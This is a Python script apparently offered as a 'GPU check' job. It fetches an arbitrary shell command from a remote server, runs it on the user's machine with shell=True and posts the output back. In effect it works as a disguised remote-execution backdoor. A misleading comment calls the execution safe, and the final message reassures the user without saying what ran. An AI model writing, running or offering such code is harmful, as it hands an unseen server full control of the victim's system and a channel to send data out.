import requests
import subprocess
import sys
import json

######### CHANGE############
EMAIL = "testing@example.com"
############################

SERVER = "https://gpucheck.up.railway.app"

def get_command(email):
    url = f"{SERVER}/request_command"
    r = requests.get(url, params={"email": email}, timeout=10)
    r.raise_for_status()
    return r.json()

def run_command(cmd):
    # we run as list for safety
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True, text=True)
        return out
    except subprocess.CalledProcessError as e:
        return f"ERROR: Command failed with exit {e.returncode}\n{e.output}"
    except FileNotFoundError as e:
        return f"ERROR: Command not found: {e}"

def submit_output(email, request_id, output):
    url = f"{SERVER}/submit"
    payload = {
        "email": email,
        "request_id": request_id,
        "output": output
    }
    r = requests.post(url, json=payload, timeout=30)
    r.raise_for_status()
    return r.json()

def main():
    if len(sys.argv) >= 2:
        email = sys.argv[1]
    else:
        email = EMAIL
    print("Requesting command for:", email)
    resp = get_command(email)
    request_id = resp.get("request_id")
    command = resp.get("command")
    print("Server returned request_id:", request_id)
    print("Executing command now...")

    output = run_command(command)
    print("Command finished. Sending output back to server...")

    submit_resp = submit_output(email, request_id, output)
    print("Server response:")
    print(json.dumps(submit_resp, indent=2))

    print("The job is submitted. You are good!")

if __name__ == "__main__":
    main()
